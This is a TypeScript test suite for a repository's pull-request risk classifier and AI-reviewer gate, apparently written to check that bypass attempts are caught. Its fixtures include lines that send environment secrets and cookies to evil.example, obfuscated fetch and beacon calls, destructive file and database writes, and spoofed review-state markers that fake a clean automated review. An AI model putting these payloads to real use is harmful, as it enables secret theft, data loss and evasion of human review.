import test from 'node:test';
import assert from 'node:assert/strict';
import {
  classifyRisk,
  evaluateIndependentReview,
  evaluateLeanGate,
  loadPullRequestPolicy,
  resolveOperatingMode,
  isTrustedReviewerArtifact,
  isTrustedReviewerEscalation,
  reviewerRequestsProtected,
  scanUiContent,
  standardRuleFor,
  isTierCPath,
  TIER_C_EXACT_PATHS as POLICY_TIER_C_EXACT_PATHS,
  TIER_C_PATH_PREFIXES as POLICY_TIER_C_PATH_PREFIXES,
  TIER_C_PATH_PATTERNS as POLICY_TIER_C_PATH_PATTERNS,
} from './operating-model.cjs';
import { TIER_C_EXACT_PATHS, TIER_C_PATH_PATTERNS, TIER_C_PATH_PREFIXES, isTierCPath as mergeRiskIsTierCPath } from './merge-risk.js';

// Must be in the past: a future activation is not armed.
const ACTIVATED = '2026-01-01T00:00:00Z';
const HEAD = 'a'.repeat(40);
const OLD_HEAD = 'b'.repeat(40);
const CODEX = 'chatgpt-codex-connector[bot]';
// GraphQL reports bot logins WITHOUT the [bot] suffix (verified against PR #1837).
const CODEX_GQL = 'chatgpt-codex-connector';
const T0 = '2026-12-02T00:00:00Z';
const T1 = '2026-12-02T01:00:00Z';
const T2 = '2026-12-02T02:00:00Z';
const T3 = '2026-12-02T03:00:00Z';

type Row = Record<string, unknown>;

function file(filename: string, extra: Row = {}): Row {
  return { filename, status: 'modified', additions: 1, deletions: 0, patch: '@@ -1,1 +1,2 @@\n context\n+export const a = 1;\n', ...extra };
}
function addedTest(filename: string, body = "+test('adds a case', () => { assert.equal(1, 1); });\n"): Row {
  return { filename, status: 'added', additions: 1, deletions: 0, patch: `@@ -0,0 +1 @@\n${body}` };
}
const CLEAN_UI = "import { useState } from 'react';\nimport { Card } from '@/components/ui/Card';\nexport function Widget() { const [a] = useState(1); return <Card>{a}</Card>; }\n";
function ui(filename: string, headContent: string | undefined = CLEAN_UI, extra: Row = {}): Row {
  return { ...file(filename), headContent, ...extra };
}

function review(overrides: Row = {}): Row {
  return { id: 1, user: { login: CODEX, type: 'Bot' }, commit_id: HEAD, state: 'COMMENTED', body: 'Looks fine.', submitted_at: T1, ...overrides };
}
function finding(overrides: Row = {}, threadOverrides: Row = {}): Row {
  return {
    isResolved: false,
    comments: [{ author: { login: CODEX_GQL, __typename: 'Bot' }, body: '**![P1 Badge](https://img.shields.io/badge/P1-orange)** Null handling is wrong', createdAt: T0, pullRequestReview: { databaseId: 5, submittedAt: T0 }, ...overrides }],
    ...threadOverrides,
  };
}
function summary(state: Row, overrides: Row = {}): Row {
  const body = `<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 ${JSON.stringify({ code_review: { commit_sha: HEAD, has_any_findings: false, has_unresolved_findings: false, status: 'completed', ...state }, security_review: {} })} -->\n\nCodex Review Summary`;
  return { author: { login: CODEX_GQL, __typename: 'Bot' }, body, updatedAt: T2, editor: { login: CODEX_GQL }, ...overrides };
}
const ir = (input: Row) => evaluateIndependentReview({ headSha: HEAD, prAuthorLogin: 'griff843', ...input });

// ── Mode resolution: global, two keys, rollback stops everything ───────────

test('mode: default legacy; lean needs OPERATING_MODEL=lean AND a valid LEAN_MODE_ACTIVATED_AT', () => {
  assert.equal(resolveOperatingMode({}).mode, 'legacy');
  assert.equal(resolveOperatingMode({ flag: 'lean' }).mode, 'legacy');
  assert.equal(resolveOperatingMode({ flag: 'lean', activatedAt: 'not-a-date' }).mode, 'legacy');
  assert.equal(resolveOperatingMode({ flag: 'leanish', activatedAt: ACTIVATED }).mode, 'legacy');
  assert.equal(resolveOperatingMode({ flag: ' LEAN ', activatedAt: ACTIVATED }).mode, 'lean');
});

test('rollback: OPERATING_MODEL != lean forces legacy for every PR, including ones opened while lean was active', () => {
  for (const flag of ['legacy', '', 'off', undefined]) {
    assert.equal(resolveOperatingMode({ flag, activatedAt: ACTIVATED }).mode, 'legacy', String(flag));
  }
  // No per-PR window survives rollback: the old LEAN_MODE_DEACTIVATED_AT input is ignored.
  assert.equal(resolveOperatingMode({ flag: 'legacy', activatedAt: ACTIVATED, deactivatedAt: '2099-01-01T00:00:00Z', prCreatedAt: '2026-12-05T00:00:00Z' } as never).mode, 'legacy');
});

// ── Classification: allow-list, adversarial table ──────────────────────────

const MUST_BE_PROTECTED: string[] = [
  // Reviewer-listed nested bypasses of the old deny-list.
  'apps/api/src/routes/kill-switch.ts',
  'apps/api/src/handlers/settle-pick.ts',
  'apps/api/src/controllers/retry-delivery-controller.ts',
  'apps/api/src/controllers/settle-pick-controller.ts',
  'apps/api/src/routes/grading.ts',
  'apps/ingestor/src/results-resolver.ts',
  'apps/ingestor/src/resolvers/results-resolver.ts',
  'apps/command-center/src/app/operations/discord/page.tsx',
  'apps/command-center/src/lib/operations/discord.ts',
  'apps/discord-bot/src/role-guard.ts',
  'apps/discord-bot/src/tier-resolver.ts',
  'apps/discord-bot/src/handlers/member-tier-sync.ts',
  'scripts/ops/pre-merge-authorization.ts',
  'scripts/ops/pm-verdict.ts',
  'scripts/ops/executor-result-check-selection.cjs',
  '.claude/settings.json',
  '.claude/settings.local.json',
  '.claude/hooks/session-start.sh',
  '.claude/hooks/pre-tool-use.ts',
  '.claude/commands/dispatch.md',
  'CLAUDE.md',
  'AGENTS.md',
  'apps/api/CLAUDE.md',
  'docs/mission/intent.md',
  'docs/mission/plan.md',
  'docs/05_operations/STANDING_GUARDRAILS.md',
  'docs/05_operations/T1_PRODUCTION_READINESS_CONTRACT.md',
  'docs/05_operations/anything.md',
  'docs/00_constitution/x.md',
  'docs/03_product/COMMAND_CENTER_PRODUCT_CONTRACT.md',
  'docs/03_product/smart-form/intent.md',
  'docs/06_status/lanes/WORK-1.json',
  'docs/06_status/proof/WORK-1/evidence.md',
  'docs/06_status/readiness/readiness-score.json',
  'docs/governance/merge-rules.md',
  // Generated / snapshot paths never make anything Standard.
  'packages/db/src/database.types.ts',
  'apps/api/src/database.types.ts',
  'apps/command-center/src/components/__snapshots__/Widget.test.tsx.snap',
  'apps/api/src/__snapshots__/x.snap',
  'pnpm-lock.yaml',
  'package.json',
  'apps/api/package.json',
  'tsconfig.json',
  // Ordinary app/package code is Protected by default (fail-closed).
  'apps/api/src/some-new-module.ts',
  'apps/api/src/deeply/nested/util.ts',
  'packages/domain/src/math.ts',
  'apps/command-center/src/lib/format.ts',
  'apps/command-center/src/app/page.tsx',
  'apps/command-center/src/middleware.ts',
  'apps/smart-form/auth.ts',
  'apps/smart-form/lib/auth-session.ts',
  'supabase/migrations/202611090000_x.sql',
  '.github/workflows/ci.yml',
  '.github/CODEOWNERS',
  'scripts/ops/operating-model.cjs',
  'scripts/ops/operating-model.test.ts',
  'scripts/ops/some-new.test.ts',
  'scripts/ci/x.ts',
  'deploy/docker-compose.yml',
  '.env',
  '.env.local',
  'local.env',
  'apps/api/.env.example',
  // UI dirs, but sensitive names / non-UI extensions.
  'apps/command-center/src/components/SettlementForm.tsx',
  'apps/command-center/src/components/ReviewActions.tsx',
  'apps/command-center/src/components/InterventionAction.tsx',
  'apps/command-center/src/components/CorrectionForm.tsx',
  'apps/command-center/src/components/KillSwitchPanel.tsx',
  'apps/command-center/src/components/DeliveryStatus.tsx',
  'apps/command-center/src/components/MemberTierBadge.tsx',
  'apps/command-center/src/components/helpers.ts',
  'apps/command-center/src/components/logo.png',
  // Tests of sensitive modules, fixtures, traversal tricks.
  'apps/api/src/settlement-service.test.ts',
  'apps/api/src/routes/kill-switch.test.ts',
  'apps/api/src/__fixtures__/a.test.ts',
  'apps/command-center/src/components/../lib/x.tsx',
  'docs/../CLAUDE.md',
];

test('classify (adversarial): every sensitive or unknown path is Protected', () => {
  for (const path of MUST_BE_PROTECTED) {
    const result = classifyRisk({ files: [path.startsWith('apps/command-center/src/components/') ? ui(path) : file(path)] });
    assert.equal(result.class, 'Protected', `expected Protected: ${path}`);
    assert.equal(standardRuleFor(path), null, `unexpected Standard rule for ${path}`);
  }
});

test('classify: every merge-risk.ts Tier C exact path and prefix is Protected (parity)', () => {
  for (const exact of TIER_C_EXACT_PATHS) {
    assert.equal(classifyRisk({ files: [file(exact)] }).class, 'Protected', exact);
  }
  for (const prefix of TIER_C_PATH_PREFIXES) {
    assert.equal(classifyRisk({ files: [file(`${prefix}example.ts`)] }).class, 'Protected', prefix);
  }
});

test('Tier C lists in operating-model.cjs mirror merge-risk.ts exactly', () => {
  assert.deepEqual([...POLICY_TIER_C_EXACT_PATHS].sort(), [...TIER_C_EXACT_PATHS].sort());
  assert.deepEqual([...POLICY_TIER_C_PATH_PREFIXES].sort(), [...TIER_C_PATH_PREFIXES].sort());
  assert.deepEqual(POLICY_TIER_C_PATH_PATTERNS.map(String).sort(), TIER_C_PATH_PATTERNS.map(String).sort());
});

// Codex P1 on #1842: an add-only unit test, a nested file, a doc or a fixture
// under a Tier C prefix must never reach a Standard rule (AGENTS.md: PM approval
// for every file under those trees, no test exemption).
test('classify (adversarial, Tier C veto): new tests, nested files, docs and fixtures under every Tier C prefix are Protected', () => {
  const leaves = [
    'example.test.ts',
    'example.spec.ts',
    'example.test.tsx',
    'market/market-key.test.ts',
    'a/b/c/deep.test.ts',
    'src/nested.test.ts',
    'nested/notes.md',
    'notes.md',
    '__fixtures__/x.json',
    'components/Widget.tsx',
  ];
  for (const prefix of TIER_C_PATH_PREFIXES) {
    for (const leaf of leaves) {
      const name = `${prefix}${leaf}`;
      assert.equal(isTierCPath(name), true, `isTierCPath ${name}`);
      assert.equal(mergeRiskIsTierCPath(name), true, `merge-risk agrees ${name}`);
      assert.equal(standardRuleFor(name), null, `unexpected Standard rule for ${name}`);
      const entry = /\.(?:test|spec)\.tsx?$/u.test(name) ? addedTest(name) : file(name);
      const result = classifyRisk({ files: [entry] });
      assert.equal(result.class, 'Protected', `expected Protected: ${name}`);
      assert.match(result.reasons[0]!.detail as string, /Tier C/u, name);
    }
  }
  // The two examples named in the review, as clean add-only tests.
  for (const name of ['packages/domain/src/market/market-key.test.ts', 'packages/contracts/src/canonical-pick.test.ts', 'packages/config/src/env.parse.test.ts']) {
    assert.equal(classifyRisk({ files: [addedTest(name)] }).class, 'Protected', name);
  }
  // A Tier C test file mixed into an otherwise Standard PR makes the PR Protected.
  assert.equal(classifyRisk({ files: [file('docs/03_product/notes.md'), addedTest('packages/domain/src/market/market-key.test.ts')] }).class, 'Protected');
  // Tier C exact paths and patterns are vetoed too, whatever rule they resemble.
  for (const name of [...TIER_C_EXACT_PATHS, 'apps/api/src/odds-service.ts', 'docs/05_operations/X_POLICY.md', 'docs/05_operations/Y_SPEC.md', 'scripts/ops/lane-x.ts']) {
    assert.equal(standardRuleFor(name), null, name);
  }
});

test('classify: the Tier C veto does not remove ordinary Standard paths outside Tier C', () => {
  for (const name of ['packages/domain-utils/src/a.test.ts', 'packages/db/src/odds-math.test.ts', 'apps/api/src/odds-math.test.ts']) {
    assert.equal(isTierCPath(name), false, name);
    assert.equal(classifyRisk({ files: [addedTest(name)] }).class, 'Standard', name);
  }
});

test('classify: the allow-list admits plain docs, add-only unit tests and clean UI components', () => {
  const result = classifyRisk({
    files: [
      file('docs/03_product/board-layout-notes.md'),
      file('docs/archive/old.md', { status: 'removed', additions: 0, deletions: 4 }),
      addedTest('apps/api/src/odds-math.test.ts'),
      addedTest('packages/verification/src/market/market-key.test.ts'),
      ui('apps/command-center/src/components/MiniSparkline.tsx'),
      ui('apps/command-center/src/components/ui/Badge.tsx', "import { cn } from '@/lib/utils';\nimport { Icon } from './Icon';\nexport const B = () => <span className={cn('x')}><Icon /></span>;\n"),
    ],
  });
  assert.deepEqual(result.reasons, []);
  assert.equal(result.class, 'Standard');
});

test('classify: a renamed file is Standard only when both sides are on the same Standard rule', () => {
  assert.equal(classifyRisk({ files: [file('docs/03_product/a.md', { status: 'renamed', previous_filename: 'docs/05_operations/a.md' })] }).class, 'Protected');
  assert.equal(classifyRisk({ files: [file('docs/03_product/b.md', { status: 'renamed', previous_filename: 'docs/03_product/a.md' })] }).class, 'Standard');
  assert.equal(classifyRisk({ files: [ui('apps/command-center/src/components/A.tsx', CLEAN_UI, { status: 'renamed', previous_filename: 'apps/command-center/src/lib/a.tsx' })] }).class, 'Protected');
});

test('classify: empty or missing file list is Protected, never Standard', () => {
  assert.equal(classifyRisk({ files: [] }).class, 'Protected');
  assert.equal(classifyRisk({}).class, 'Protected');
  assert.equal(classifyRisk({ files: [{}] }).class, 'Protected');
});

// ── Content escalation ──────────────────────────────────────────────────────

test('content (adversarial): removed assertions in a test escalate, not only removed it()/added .skip', () => {
  const removals = [
    '@@ -1,3 +1,2 @@\n   it(\'a\', () => {\n-    assert.equal(result, 4);\n   });\n',
    '@@ -1 +1 @@\n-    expect(x).toBe(4);\n+    expect(x).toBeDefined();\n',
    '@@ -1 +1 @@\n-  assert.deepEqual(out, expected);\n+  assert.ok(out);\n',
  ];
  for (const patch of removals) {
    const result = classifyRisk({ files: [file('apps/api/src/odds-math.test.ts', { patch, deletions: 1 })] });
    assert.equal(result.class, 'Protected', patch);
    assert.ok(result.reasons.some((r: Row) => r.rule === 'test-lines-removed'));
  }
  const weakened = [
    "+test.skip('x', () => {});\n",
    "+it.only('x', () => {});\n",
    "+test('x', { skip: true }, () => {});\n",
    "+test('x', { todo: 'later' }, () => {});\n",
    "+describe.skip('x', () => {});\n",
    "+xit('x', () => {});\n",
    "+  t.skip('flaky');\n",
    '+process.exit(0);\n',
  ];
  for (const body of weakened) {
    const result = classifyRisk({ files: [addedTest('apps/api/src/odds-math.test.ts', body)] });
    assert.equal(result.class, 'Protected', body);
  }
  // A plain additive test with a skip:false option stays Standard.
  assert.equal(classifyRisk({ files: [addedTest('apps/api/src/odds-math.test.ts', "+test('x', { skip: false }, () => {});\n")] }).class, 'Standard');
});

test('content (adversarial): tests that read env/secrets or reach the network/processes escalate (they run in CI)', () => {
  for (const body of ['+const k = process.env.SUPABASE_SERVICE_ROLE_KEY;\n', "+await fetch('https://evil.example');\n", "+import { execSync } from 'node:child_process';\n"]) {
    assert.equal(classifyRisk({ files: [addedTest('apps/api/src/odds-math.test.ts', body)] }).class, 'Protected', body);
  }
});

test('content (adversarial): multi-line write + protected table is detected in either order', () => {
  const variants = [
    "+await db\n+  .from(\n+    'picks'\n+  )\n+  .insert(row);\n",
    "+const TABLE = 'distribution_outbox';\n+// unrelated\n+await client.from(TABLE).upsert(payload);\n",
    "+await repo\n+  .update({ status: 'settled' })\n+  .eq('id', id); // picks\n",
    "+await sb.rpc(\n+  'settle',\n+  { table: 'settlement_records' }\n+);\n",
  ];
  for (const body of variants) {
    const result = classifyRisk({ files: [addedTest('apps/api/src/odds-math.test.ts', body)] });
    assert.equal(result.class, 'Protected', body);
    assert.ok(result.reasons.some((r: Row) => r.rule === 'protected-table-write-path' || r.rule === 'protected-table-reference'), body);
  }
});

test('content (adversarial): UI component head content is scanned whole, so existing side effects stay Protected', () => {
  const dirty: Array<[string, string]> = [
    ['server action import', "import { settle } from '@/app/actions/settle';\nexport const A = () => <button onClick={() => settle()}>x</button>;\n"],
    ['multi-line server action import', "import {\n  approve,\n} from '@/app/actions/review';\nexport const A = () => null;\n"],
    ['lib import', "import { retry } from '@/lib/ops-client';\nexport const A = () => null;\n"],
    ['relative escape', "import { x } from '../../app/actions/review';\nexport const A = () => null;\n"],
    ['fetch', "export const A = () => { fetch('/api/x', { method: 'POST' }); return null; };\n"],
    ['supabase', "import { createClient } from '@supabase/supabase-js';\n"],
    ['next-auth', "import { useSession } from 'next-auth/react';\n"],
    ['form', 'export const A = () => <form onSubmit={x}><input /></form>;\n'],
    ['env', 'export const A = () => <span>{process.env.NEXT_PUBLIC_X}</span>;\n'],
    ['dynamic import', 'export const load = (m: string) => import(m);\n'],
    ['html injection', 'export const A = ({ h }: { h: string }) => <div dangerouslySetInnerHTML={{ __html: h }} />;\n'],
  ];
  for (const [label, content] of dirty) {
    assert.ok(scanUiContent('apps/command-center/src/components/Widget.tsx', content).length > 0, label);
    assert.equal(classifyRisk({ files: [ui('apps/command-center/src/components/Widget.tsx', content)] }).class, 'Protected', label);
  }
  // Missing head content is not evidence of safety.
  assert.equal(classifyRisk({ files: [file('apps/command-center/src/components/Widget.tsx')] }).class, 'Protected');
  // Deleting a component is not Standard either.
  assert.equal(classifyRisk({ files: [ui('apps/command-center/src/components/Widget.tsx', CLEAN_UI, { status: 'removed', patch: '@@ -1 +0,0 @@\n-x\n' })] }).class, 'Protected');
});

test('content (adversarial): snapshot or generated files cannot hide code and are never exempt', () => {
  const result = classifyRisk({
    files: [
      addedTest('apps/api/src/odds-math.test.ts'),
      file('apps/api/src/__snapshots__/odds-math.test.ts.snap', { patch: undefined, additions: 900 }),
    ],
  });
  assert.equal(result.class, 'Protected');
  assert.ok(result.reasons.some((r: Row) => String(r.file).endsWith('.snap')));
  const types = classifyRisk({ files: [file('packages/db/src/database.types.ts', { patch: "@@ -1 +1 @@\n+export type X = 1;\n" })] });
  assert.equal(types.class, 'Protected');
  // Missing patch on a Standard code candidate escalates.
  assert.equal(classifyRisk({ files: [addedTest('apps/api/src/odds-math.test.ts'), { ...addedTest('apps/api/src/odds-extra.test.ts'), patch: undefined }] }).class, 'Protected');
});

// ── Adversarial-review regressions (one per reported bypass) ────────────────

test('mode (adversarial P3): LEAN_MODE_ACTIVATED_AT must be strict ISO-8601 and not in the future', () => {
  const now = Date.parse('2026-11-10T00:00:00Z');
  for (const activatedAt of ['1', 'Dec 1 2025', '2025-13-45', '2026/01/01', '2026-01-01 00:00', '2026-11-11T00:00:00Z', '2999-01-01']) {
    assert.equal(resolveOperatingMode({ flag: 'lean', activatedAt, now }).mode, 'legacy', activatedAt);
  }
  for (const activatedAt of ['2026-01-01', '2026-11-09T23:59:59Z', '2026-11-09T12:00:00.123+02:00']) {
    assert.equal(resolveOperatingMode({ flag: 'lean', activatedAt, now }).mode, 'lean', activatedAt);
  }
});

const UI_BYPASSES: Array<[string, string, string]> = [
  ['P1-a alias with ..', 'Widget.tsx', "import { settle } from '@/components/../app/actions/settle';\nexport const A = () => <button onClick={() => settle()}>x</button>;\n"],
  ['P1-a comment before specifier', 'Widget.tsx', "import { doIt } from /**/ '@/lib/server/thing';\nexport const A = () => null;\n"],
  ['P1-a line comment before specifier', 'Widget.tsx', "import { doIt } from // hi\n  '@/lib/server/thing';\nexport const A = () => null;\n"],
  ['P1-a export-from with ..', 'Widget.tsx', "export { x as default } from '@/components/ui/../../app/api/x/route';\n"],
  ['P1-a escaped specifier', 'Widget.tsx', "import { x } from '@/components/\\u002e\\u002e/app/x';\n"],
  ['P1-a relative ..', 'ui/Widget.tsx', "import { Icon } from '../Icon';\nexport const A = () => <Icon />;\n"],
  ['P1-b fetch.call', 'Widget.tsx', "export const A = () => <button onClick={() => fetch.call(null, '/api/x', { method: 'POST' })}>x</button>;\n"],
  ['P1-b globalThis[fetch]', 'Widget.tsx', "export const A = () => <button onClick={() => { const f = globalThis['fetch']; f('/api/x'); }}>x</button>;\n"],
  ['P1-b navigator computed', 'Widget.tsx', "export const A = () => <button onClick={() => navigator['sendB' + 'eacon']('/api/x')}>x</button>;\n"],
  ['P1-b document[cookie]', 'Widget.tsx', "export const A = () => <img src={'https://e.example/?c=' + document['cookie']} />;\n"],
  ['P1-b window[]', 'Widget.tsx', "export const A = () => { window['loc' + 'ation'] = '/x'; return null; };\n"],
  ['P1-b self[]', 'Widget.tsx', "export const A = () => { self['f' + 'etch']('/x'); return null; };\n"],
  ['P1-b XMLHttpRequest', 'Widget.tsx', 'export const A = () => { new XMLHttpRequest(); return null; };\n'],
  ['P1-b createElement form', 'Widget.tsx', "import React from 'react';\nexport const A = () => React.createElement('form', { method: 'post', ['act' + 'ion']: '/api/x' });\n"],
  ['P1-b createElement non-literal', 'Widget.tsx', "import React from 'react';\nconst t = 'fo' + 'rm';\nexport const A = () => React.createElement(t, {});\n"],
  ['P1-b template use server', 'Widget.tsx', 'export function A() { async function go() { `use server`; } return <button onClick={go} />; }\n'],
  ['P3 css @import', 'a.css', '@import url("https://evil.example/x.css");\n'],
  ['P3 css url(http)', 'a.css', '.x { background: url(https://evil.example/p.png); }\n'],
  ['P3 css protocol-relative url', 'a.css', ".x { background: url('//evil.example/p.png'); }\n"],
];

test('content (adversarial P1-a/P1-b/P3): every reported UI bypass is Protected', () => {
  for (const [label, name, content] of UI_BYPASSES) {
    const filename = `apps/command-center/src/components/${name}`;
    assert.ok(scanUiContent(filename, content).length > 0, label);
    assert.equal(classifyRisk({ files: [ui(filename, content)] }).class, 'Protected', label);
  }
  // Clean CSS stays Standard.
  assert.equal(classifyRisk({ files: [ui('apps/command-center/src/components/a.css', '.x { color: red; background: url(./local.png); }\n')] }).class, 'Standard');
});

test('content (adversarial P2-b): modified test files are Protected even when only lines are added', () => {
  const patches = [
    '@@ -10,3 +10,5 @@\n test("x", () => {\n+  /*\n   assert.equal(a, 1);\n+  */\n });\n',
    '@@ -10,3 +10,4 @@\n test("x", () => {\n+  return;\n   assert.equal(a, 1);\n });\n',
    '@@ -1,2 +1,3 @@\n import test from "node:test";\n+const test = (n, f) => {};\n',
  ];
  for (const patch of patches) {
    const result = classifyRisk({ files: [file('apps/api/src/odds-math.test.ts', { patch })] });
    assert.equal(result.class, 'Protected', patch);
    assert.ok(result.reasons.some((r: Row) => r.rule === 'test-not-new'), patch);
  }
  for (const status of ['renamed', 'copied', 'changed']) {
    assert.equal(classifyRisk({ files: [addedTest('apps/api/src/odds-math.test.ts', undefined)].map(f => ({ ...f, status, previous_filename: 'apps/api/src/odds-math.test.ts' })) }).class, 'Protected', status);
  }
});

test('content (adversarial P2-c): newly added tests touching process/network/FS/DB are Protected', () => {
  const bodies = [
    '+import https from "node:https";\n+const e = process["env"];\n+https.get("https://evil.example/?" + JSON.stringify(e));\n',
    '+import { writeFileSync } from "node:fs";\n+writeFileSync("../../scripts/ops/x.cjs", "boom");\n',
    '+import { createDatabaseClient } from "./client";\n+const T = ["pi", "cks"].join("");\n+await createDatabaseClient().from(T).delete().neq("id", "");\n',
    "+import http from 'http';\n",
    "+import net from 'node:net';\n",
    "+const cp = require('child_process');\n",
    "+import fs from 'fs/promises';\n",
    "+const m = await import('node:' + 'fs');\n",
    '+const g = globalThis;\n',
    "+import { createClient } from '@supabase/supabase-js';\n",
    "+import { Pool } from 'pg';\n",
  ];
  for (const body of bodies) {
    assert.equal(classifyRisk({ files: [addedTest('apps/api/src/new.test.ts', body)] }).class, 'Protected', body);
  }
  // node:test / node:assert stay allowed.
  assert.equal(classifyRisk({ files: [addedTest('apps/api/src/new.test.ts', "+import test from 'node:test';\n+import assert from 'node:assert/strict';\n+test('x', () => { assert.equal(1, 1); });\n")] }).class, 'Standard');
});

test('paths (adversarial P2-d): governance-like doc names are Protected regardless of case', () => {
  for (const path of [
    'docs/ops/backup-dr-policy.md',
    'docs/ops/db-networking-policy.md',
    'docs/02_architecture/contracts/environment_contract.md',
    'docs/03_product/best_bets_channel_contract.md',
    'docs/03_product/pick_spec.md',
    'docs/03_product/team-charter.md',
    'docs/ops/dr-plan.md',
    'docs/ops/Backup.md',
    'docs/ops/Environment.md',
  ]) {
    assert.equal(standardRuleFor(path), null, path);
    assert.equal(classifyRisk({ files: [file(path)] }).class, 'Protected', path);
  }
  assert.equal(standardRuleFor('docs/03_product/board-layout-notes.md'), 'docs');
});

// ── Independent review ─────────────────────────────────────────────────────

test('review: passes only on the anchored connector summary bound to the exact head', () => {
  const result = ir({ comments: [summary({})] });
  assert.equal(result.pass, true, result.reasons.join(' '));
  assert.deepEqual(result.reviewers, ['chatgpt-codex-connector']);
  assert.equal(ir({ reviews: [review()], comments: [summary({})] }).pass, true, 'a clean review beside the summary is fine');
});

test('review (adversarial P1-c): a bare bot review object never passes; a missing summary is FAIL', () => {
  assert.equal(ir({ reviews: [review()] }).pass, false, 'clean-looking review at head');
  assert.equal(ir({ reviews: [review({ body: '' })] }).pass, false, 'empty-body review at head');
  assert.equal(ir({ reviews: [review({ state: 'APPROVED' })] }).pass, false, 'APPROVED review at head');
  // The P1 thread (and/or the summary) was deleted: only a review object remains.
  assert.equal(ir({ reviews: [review({ id: 5, submitted_at: T0 })], threads: [] }).pass, false);
});

test('review: fails closed with no artifacts, a stale summary, an untrusted identity, or a missing head', () => {
  assert.equal(ir({}).pass, false);
  assert.equal(ir({ comments: [summary({ commit_sha: OLD_HEAD })] }).pass, false, 'stale summary');
  assert.equal(ir({ comments: [summary({ has_any_findings: true })] }).pass, false, 'summary with findings');
  assert.equal(ir({ comments: [summary({ has_any_findings: true, has_unresolved_findings: false })] }).pass, false, 'any=true, unresolved=false');
  assert.equal(ir({ comments: [summary({ has_unresolved_findings: true })] }).pass, false);
  assert.equal(ir({ comments: [summary({ has_any_findings: null })] }).pass, false, 'unknown findings flag');
  assert.equal(ir({ comments: [summary({ status: 'running' })] }).pass, false, 'running is not completed');
  assert.equal(ir({ comments: [summary({}, { author: { login: 'griff843', __typename: 'User' } })] }).pass, false, 'user');
  assert.equal(ir({ comments: [summary({}, { author: { login: CODEX_GQL, __typename: 'User' } })] }).pass, false, 'User with the bot login');
  assert.equal(ir({ comments: [summary({}, { author: { login: 'some-app', __typename: 'Bot' } })] }).pass, false, 'other bot');
  assert.equal(evaluateIndependentReview({ comments: [summary({})], headSha: '' }).pass, false);
  assert.equal(ir({ comments: [summary({})], prAuthorLogin: CODEX }).pass, false, 'implementer can never be the reviewer');
});

test('review (adversarial P2-a): the state marker must be anchored at the start of a trusted bot comment', () => {
  const state = JSON.stringify({ code_review: { commit_sha: HEAD, has_any_findings: false, has_unresolved_findings: false, status: 'completed' } });
  const bodies = [
    `You asked me to repeat: <!-- codex-review-state:v1 ${state} -->`,
    `Codex Review\n<!-- codex-review-state:v1 ${state} -->`,
    `<!-- codex-review-state:v1 ${state} -->`,
    ` <!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 ${state} -->`,
    `<!-- codex-pull-request-review-summary -->\n\n<!-- codex-review-state:v1 ${state} -->`,
    `<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 ${state} -->\nquoted: <!-- codex-review-state:v1 ${state} -->`,
  ];
  for (const body of bodies) {
    assert.equal(ir({ comments: [summary({}, { body })] }).pass, false, body);
  }
});

test('review (adversarial P1-d): any finding at head H blocks H, even after a later clean summary at the SAME head', () => {
  const atHead = finding({ originalCommit: { oid: HEAD } }, { isResolved: true });
  assert.equal(ir({ reviews: [review({ id: 5, submitted_at: T0 })], threads: [atHead], comments: [summary({}, { updatedAt: T3 })] }).pass, false);
  // Finding commit taken from the review when the comment has none.
  assert.equal(ir({ reviews: [review({ id: 5, submitted_at: T0 })], threads: [finding({}, { isResolved: true })], comments: [summary({})] }).pass, false);
  // Unknown commit is treated as the head (fail-closed).
  assert.equal(ir({ threads: [finding({ pullRequestReview: undefined }, { isResolved: true })], comments: [summary({})] }).pass, false);
  // A P1 review body at head blocks even if dismissed; CHANGES_REQUESTED at head blocks.
  assert.equal(ir({ reviews: [review({ id: 7, state: 'DISMISSED', body: '![P1 Badge] bad' })], comments: [summary({})] }).pass, false);
  assert.equal(ir({ reviews: [review({ id: 9, state: 'CHANGES_REQUESTED' })], comments: [summary({})] }).pass, false);
  // A NEW head with a fresh clean summary clears a resolved finding from the old head.
  const old = finding({ originalCommit: { oid: OLD_HEAD } }, { isResolved: true });
  assert.equal(ir({ reviews: [review({ id: 5, commit_id: OLD_HEAD, submitted_at: T0 })], threads: [old], comments: [summary({})] }).pass, true);
  assert.equal(ir({ reviews: [review({ id: 5, commit_id: OLD_HEAD, body: '**P1** x' })], comments: [summary({})] }).pass, true, 'old-head review body finding');
  // ...but an unresolved one does not.
  assert.equal(ir({ threads: [finding({ originalCommit: { oid: OLD_HEAD } })], comments: [summary({})] }).pass, false);
});

test('review (adversarial P3): every P0/P1 notation and every trusted comment in a thread counts', () => {
  for (const body of ['**P1** data loss', 'Severity: critical (P1).', '[P1] wrong', 'P1: wrong', 'P0 - bad', 'p1: bad', 'Priority 1 issue', '![P0 Badge](x)']) {
    const thread = { isResolved: true, comments: [{ author: { login: CODEX_GQL, __typename: 'Bot' }, body, createdAt: T0, originalCommit: { oid: HEAD } }] };
    assert.equal(ir({ threads: [thread], comments: [summary({})] }).pass, false, body);
    assert.equal(ir({ reviews: [review({ body })], comments: [summary({})] }).pass, false, `review body: ${body}`);
  }
  // Bot P1 as a reply under a human first comment.
  const reply = { isResolved: false, comments: [{ author: { login: 'griff843', __typename: 'User' }, body: 'question', createdAt: T0 }, { author: { login: CODEX_GQL, __typename: 'Bot' }, body: '**P1** yes, broken', createdAt: T1, originalCommit: { oid: OLD_HEAD } }] };
  assert.equal(ir({ threads: [reply], comments: [summary({})] }).pass, false);
  // P2 badges are not findings.
  const p2 = { isResolved: false, comments: [{ author: { login: CODEX_GQL, __typename: 'Bot' }, body: '![P2 Badge](https://img.shields.io/badge/P2-yellow) nit', createdAt: T0, originalCommit: { oid: HEAD } }] };
  assert.equal(ir({ threads: [p2], comments: [summary({})] }).pass, true);
});

test('review (adversarial): trusted artifacts edited by another account are never clean', () => {
  const edited = finding({ body: 'nit', editor: { login: 'griff843' }, originalCommit: { oid: OLD_HEAD } }, { isResolved: true });
  assert.equal(ir({ threads: [edited], comments: [summary({})] }).pass, false);
  assert.equal(ir({ reviews: [review({ editor: { login: 'griff843' } })], comments: [summary({})] }).pass, false);
  assert.equal(ir({ comments: [summary({}, { editor: { login: 'griff843' } })] }).pass, false);
});

test('escalation: RISK-CLASS: PROTECTED from a trusted reviewer is sticky across heads and sources; others are ignored', () => {
  assert.equal(reviewerRequestsProtected({ reviews: [review({ body: 'x\nRISK-CLASS: PROTECTED\n' })] }), true);
